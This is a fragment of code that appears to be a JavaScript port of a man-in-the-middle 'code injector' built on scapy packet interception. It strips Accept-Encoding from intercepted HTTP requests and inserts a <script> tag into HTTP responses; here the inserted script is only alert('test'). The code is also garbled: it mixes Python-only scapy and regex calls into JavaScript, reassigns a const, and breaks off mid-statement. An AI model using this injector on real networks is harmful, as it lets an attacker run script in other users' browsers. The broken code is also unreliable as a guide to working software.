function setLoad(packet, load) {
    packet.load = load;
    delete packet.len;
    delete packet.chksum;
    delete packet.TCP.chksum;
    return packet;
}

function processPacket(packet) {
    const scapyPacket = scapy.IP(packet.getPayload());
    if (scapyPacket.hasLayer(scapy.Raw)) {
        const load = scapyPacket[scapy.Raw].load;
        if (scapyPacket[scapy.TCP].dport === 80) {
            console.log("[+] Request");
            load = re.replace("Accept-Encoding:.*?\\r\\n","",load);

            console.log(setLoad(packet, load).show());
        } else if (scapyPacket[scapy.TCP].sport === 80) {
            console.log("[+] Response");
            // console.log(scapyPacket.show());
            load = load.replace("</body>","<script>alert('test');</script></body>");
            const contentLengthSearch = re.search("Content-Length:\\s\\d*", load);
            if (contentLengthSearch) {
                const contentLength = contentLengthSearch.group(0);
                console.log(contentLength);
            }
        }
        if (load!== scapyPacket[scapy.Raw].load) {
